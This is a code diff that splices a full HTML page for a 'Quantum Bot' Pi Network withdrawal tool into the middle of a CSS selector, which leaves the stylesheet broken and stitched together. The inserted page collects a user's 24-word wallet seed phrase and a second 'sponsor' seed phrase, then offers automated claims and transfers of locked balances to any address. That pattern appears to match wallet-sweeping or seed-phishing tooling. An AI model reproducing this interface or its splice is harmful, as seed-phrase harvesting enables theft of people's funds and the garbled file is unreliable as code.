@@ -236,7 +236,149 @@
             border-radius: 4px;
         }
 
-        .log-container::-webkit-scrollbar-thumb {
+        .log-container::-webkit-scrollb<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/assets/quantum-logo.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>🚀 Quantum Bot Enhancement - Ultimate Pi Network Bot</title>
+    <link rel="stylesheet" href="/assets/quantum-bot.css">
+  </head>
+  <body>
+    <div id="root">
+      <!-- Server Time Display -->
+      <div class="server-time">
+        <h3>🕒 Server Time: <span id="server-time"></span></h3>
+      </div>
+
+      <!-- Navigation -->
+      <nav class="quantum-nav">
+        <div class="logo">
+          <h1>🚀 Quantum Bot Enhancement</h1>
+          <p>Ultimate Pi Network Domination System</p>
+        </div>
+        <div class="nav-buttons">
+          <button id="login-tab" class="nav-btn active">🔑 Login</button>
+          <button id="withdraw-tab" class="nav-btn">💸 Withdraw</button>
+        </div>
+      </nav>
+
+      <!-- Login Page -->
+      <div id="login-page" class="page active">
+        <div class="quantum-card">
+          <h2>🔐 Quantum Authentication</h2>
+          <form id="login-form">
+            <div class="input-group">
+              <label for="seed-phrase">🔑 Seed Phrase</label>
+              <textarea id="seed-phrase" placeholder="Enter your 24-word seed phrase..." required></textarea>
+            </div>
+            <button type="submit" class="quantum-btn primary">
+              🚀 Initialize Quantum Bot
+            </button>
+          </form>
+        </div>
+      </div>
+
+      <!-- Withdraw Page -->
+      <div id="withdraw-page" class="page">
+        <div class="quantum-dashboard">
+          
+          <!-- Balance Overview -->
+          <div class="balance-overview">
+            <div class="balance-card">
+              <h3>💰 Available Balance</h3>
+              <div id="available-balance" class="balance-amount">0.00 PI</div>
+            </div>
+            <div class="balance-card">
+              <h3>🔒 Locked Balance</h3>
+              <div id="locked-balance" class="balance-amount">0.00 PI</div>
+            </div>
+          </div>
+
+          <!-- Withdrawal Configuration -->
+          <div class="withdraw-config">
+            <h2>⚡ Quantum Withdrawal System</h2>
+            
+            <div class="input-group">
+              <label for="sponsor-seed">💎 Sponsor Wallet (for claim fees)</label>
+              <textarea id="sponsor-seed" placeholder="Sponsor seed phrase for paying claim fees..."></textarea>
+            </div>
+
+            <div class="input-group">
+              <label for="withdrawal-address">🎯 Withdrawal Address</label>
+              <input type="text" id="withdrawal-address" placeholder="G..." required>
+            </div>
+
+            <div class="input-group">
+              <label for="locked-balance-select">🔐 Locked Balance</label>
+              <select id="locked-balance-select">
+                <option value="">Select locked balance...</option>
+              </select>
+            </div>
+
+            <div class="input-group">
+              <label for="amount">💵 Amount</label>
+              <input type="number" id="amount" step="0.0000001" placeholder="0.00" required>
+            </div>
+
+            <button id="withdraw-btn" class="quantum-btn primary">
+              🚀 Execute Quantum Withdrawal
+            </button>
+          </div>
+
+          <!-- Recent Transactions -->
+          <div class="transactions-section">
+            <h3>📊 Recent Transactions</h3>
+            <div id="transactions-list" class="transactions-list">
+              <!-- Transactions will be loaded here -->
+            </div>
+          </div>
+
+          <!-- Live Operations Monitor -->
+          <div class="operations-monitor">
+            <h3>⚡ Live Operations Monitor</h3>
+            
+            <!-- Real-time Stats -->
+            <div class="stats-grid">
+              <div class="stat-card">
+                <h4>🎯 Claim Attempts</h4>
+                <div id="claim-attempts" class="stat-value">0</div>
+              </div>
+              <div class="stat-card">
+                <h4>💸 Transfer Attempts</h4>
+                <div id="transfer-attempts" class="stat-value">0</div>
+              </div>
+              <div class="stat-card">
+                <h4>✅ Success Count</h4>
+                <div id="success-count" class="stat-value">0</div>
+              </div>
+              <div class="stat-card">
+                <h4>🔥 Active Operations</h4>
+                <div id="active-ops" class="stat-value">0</div>
+              </div>
+            </div>
+
+            <!-- Live Log -->
+            <div class="live-log">
+              <h4>📡 Quantum Operations Log</h4>
+              <div id="log-container" class="log-container">
+                <!-- Live logs will appear here -->
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- Status Messages -->
+      <div id="status-messages" class="status-messages"></div>
+
+    </div>
+
+    <script src="/assets/quantum-bot.js"></script>
+  </body>
+</html>ar-thumb {
             background: var(--quantum-primary);
             border-radius: 4px;
         }
